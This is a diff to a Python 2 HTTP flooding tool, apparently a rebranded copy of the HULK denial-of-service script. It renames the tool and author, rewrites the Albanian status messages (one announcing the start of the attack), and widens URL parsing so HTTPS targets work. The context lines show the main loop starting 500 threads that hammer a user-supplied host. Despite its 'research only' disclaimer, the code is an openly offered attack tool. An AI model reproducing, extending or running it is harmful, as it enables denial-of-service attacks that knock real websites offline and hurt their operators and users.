@@ -1,11 +1,11 @@
 # ----------------------------------------------------------------------------------------------
-# 726 - HTTP&s Unbearable Load CPKing
+# 726 - HTTP/s Unbearable Load King
 #
-# this tool is a dos tool that is meant to put heavy load on HTTP&s servers in order to bring them
+# this tool is a dos tool that is meant to put heavy load on HTTP/s servers in order to bring them
 # to their knees by exhausting the resource pool, its is meant for research purposes only
 # and any malicious usage of this tool is prohibited.
 #
-# author :  726 DDoS Planet  , version ,2.5.0
+# author :  CyberPython , version 1.0
 # ----------------------------------------------------------------------------------------------
 import urllib2
 import sys
@@ -97,7 +97,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Stitch Response Code 500'
+			print 'Response Code 500'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -128,7 +128,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- 726 Rikthehemi Ne Baze --"
+			print "\n-- 726 Kthehete Ne Baze --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -139,15 +139,15 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- 726 Nisemi Per Ne Toke --"
+		print "-- 726 Filloje Sulmin Ne Toke --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
